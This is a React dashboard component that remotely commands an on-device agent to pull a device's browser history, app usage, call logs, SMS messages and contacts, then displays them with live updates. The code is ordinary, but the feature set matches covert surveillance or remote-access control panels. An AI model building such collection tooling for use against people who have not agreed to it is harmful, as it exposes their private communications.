"use client";

import { RefreshCw } from "lucide-react";
import { useCallback, useEffect, useRef, useState } from "react";

type DispatchFn = (
  action: string,
  payload?: Record<string, unknown>,
  target?: string
) => { ok: boolean; reason?: string };

type SubscribeFn = (
  listener: (event: { type: string; data?: ArrayBuffer | Blob; packet?: Record<string, unknown> }) => void
) => () => void;

type Entry = Record<string, unknown>;

const TABS = [
  { key: "activity", label: "Activity", url: "activity", listKey: "logs", command: "" },
  { key: "browser", label: "Browser", url: "browser-history", listKey: "history", command: "FETCH_BROWSER_HISTORY" },
  { key: "apps", label: "Apps", url: "app-history", listKey: "history", command: "FETCH_APP_HISTORY" },
  { key: "calls", label: "Calls", url: "call-logs", listKey: "logs", command: "FETCH_CALL_LOGS" },
  { key: "sms", label: "SMS", url: "sms", listKey: "messages", command: "FETCH_SMS_MESSAGES" },
  { key: "contacts", label: "Contacts", url: "contacts", listKey: "contacts", command: "FETCH_CONTACTS" },
] as const;

type TabKey = (typeof TABS)[number]["key"];

function s(e: Entry, ...keys: string[]): string {
  for (const k of keys) {
    const v = e[k];
    if (typeof v === "string" && v) return v;
    if (typeof v === "number") return String(v);
  }
  return "";
}

function timeAgo(ts: string): string {
  if (!ts) return "";
  const d = new Date(ts).getTime();
  if (Number.isNaN(d)) return ts;
  const diff = Date.now() - d;
  const m = Math.floor(diff / 60000);
  if (m < 1) return "now";
  if (m < 60) return `${m}m`;
  const h = Math.floor(m / 60);
  if (h < 24) return `${h}h`;
  return new Date(d).toLocaleDateString();
}

export function HistoryPanel({
  deviceId,
  subscribe,
  dispatch,
}: {
  deviceId: string;
  subscribe: SubscribeFn;
  dispatch: DispatchFn;
}) {
  const [tab, setTab] = useState<TabKey>("browser");
  const [entries, setEntries] = useState<Entry[]>([]);
  const [loading, setLoading] = useState(false);
  const tabRef = useRef<TabKey>(tab);
  tabRef.current = tab;

  const meta = TABS.find((t) => t.key === tab)!;

  const load = useCallback(async () => {
    if (!deviceId) return;
    setLoading(true);
    try {
      const res = await fetch(`/api/logs/${meta.url}?limit=300&deviceId=${encodeURIComponent(deviceId)}`, {
        credentials: "include",
        cache: "no-store",
      });
      const data = await res.json();
      if (data.success) setEntries((data[meta.listKey] as Entry[]) || []);
      else setEntries([]);
    } catch {
      setEntries([]);
    } finally {
      setLoading(false);
    }
  }, [deviceId, meta.url, meta.listKey]);

  useEffect(() => {
    void load();
  }, [load]);

  // Live deltas from the agent.
  useEffect(() => {
    return subscribe((event) => {
      if (event.type !== "json" || !event.packet) return;
      const msg = event.packet as Record<string, unknown>;
      if (String(msg.deviceId || "") !== deviceId) return;
      if (msg.type !== "history_telemetry") return;
      const active = TABS.find((t) => t.key === tabRef.current);
      if (!active || !active.command || msg.command !== active.command) return;
      const incoming = Array.isArray(msg.data) ? msg.data : Array.isArray(msg.entries) ? msg.entries : [];
      if (incoming.length === 0) return;
      setEntries((prev) => [...(incoming as Entry[]), ...prev].slice(0, 400));
      setLoading(false);
    });
  }, [subscribe, deviceId]);

  const refreshFromAgent = () => {
    if (meta.command) {
      setLoading(true);
      dispatch(meta.command, {}, deviceId);
      setTimeout(() => void load(), 1500);
    } else {
      void load();
    }
  };

  const renderEntry = (e: Entry, i: number) => {
    if (tab === "browser") {
      const url = s(e, "url");
      return (
        <div key={i} className="border-b border-border/40 py-1.5">
          <div className="truncate font-medium">{s(e, "title") || url}</div>
          <a href={url} target="_blank" rel="noreferrer" className="block truncate text-emerald-600">{url}</a>
          <div className="text-[10px] text-muted-foreground">
            {s(e, "browser")} · {timeAgo(s(e, "visitTime", "visit_time", "createdAt"))}
          </div>
        </div>
      );
    }
    if (tab === "apps") {
      return (
        <div key={i} className="flex justify-between border-b border-border/40 py-1.5">
          <span className="truncate">{s(e, "appName", "app_name")}</span>
          <span className="shrink-0 text-[10px] text-muted-foreground">{timeAgo(s(e, "lastOpened", "last_opened", "createdAt"))}</span>
        </div>
      );
    }
    if (tab === "calls") {
      return (
        <div key={i} className="border-b border-border/40 py-1.5">
          <div className="flex justify-between">
            <span className="truncate font-medium">{s(e, "name", "number", "phoneNumber")}</span>
            <span className="shrink-0 text-[10px] text-muted-foreground">{s(e, "type", "callType")}</span>
          </div>
          <div className="text-[10px] text-muted-foreground">{s(e, "number", "phoneNumber")} · {timeAgo(s(e, "date", "timestamp", "createdAt"))}</div>
        </div>
      );
    }
    if (tab === "sms") {
      return (
        <div key={i} className="border-b border-border/40 py-1.5">
          <div className="flex justify-between">
            <span className="truncate font-medium">{s(e, "address", "number", "sender")}</span>
            <span className="shrink-0 text-[10px] text-muted-foreground">{timeAgo(s(e, "date", "timestamp", "createdAt"))}</span>
          </div>
          <div className="truncate text-muted-foreground">{s(e, "body", "message", "text")}</div>
        </div>
      );
    }
    if (tab === "contacts") {
      return (
        <div key={i} className="flex justify-between border-b border-border/40 py-1.5">
          <span className="truncate">{s(e, "name", "displayName")}</span>
          <span className="shrink-0 text-[10px] text-muted-foreground">{s(e, "number", "phoneNumber", "phone")}</span>
        </div>
      );
    }
    // activity
    return (
      <div key={i} className="border-b border-border/40 py-1.5">
        <div className="font-medium">{s(e, "action", "type")}</div>
        <div className="truncate text-muted-foreground">{s(e, "windowTitle", "details", "appName", "url")}</div>
        <div className="text-[10px] text-muted-foreground">{timeAgo(s(e, "createdAt", "timestamp"))}</div>
      </div>
    );
  };

  return (
    <div className="flex h-full flex-col">
      <div className="flex items-center gap-1 overflow-x-auto border-b border-border bg-background/60 px-1.5 py-1.5 text-xs">
        {TABS.map((t) => (
          <button
            key={t.key}
            onClick={() => setTab(t.key)}
            className={`shrink-0 rounded-md px-2 py-0.5 font-medium ${tab === t.key ? "bg-foreground text-background" : "text-muted-foreground hover:bg-muted"}`}
          >
            {t.label}
          </button>
        ))}
        <button onClick={refreshFromAgent} className="ml-auto flex h-6 w-6 shrink-0 items-center justify-center rounded-md border border-border" title="Refresh from agent">
          <RefreshCw className={`h-3 w-3 ${loading ? "animate-spin" : ""}`} />
        </button>
      </div>
      <div className="flex-1 min-h-0 overflow-y-auto px-2.5 text-xs">
        {entries.map(renderEntry)}
        {!entries.length && <p className="py-4 text-center text-muted-foreground">{loading ? "Loading…" : "No records. Try refresh from agent."}</p>}
      </div>
    </div>
  );
}
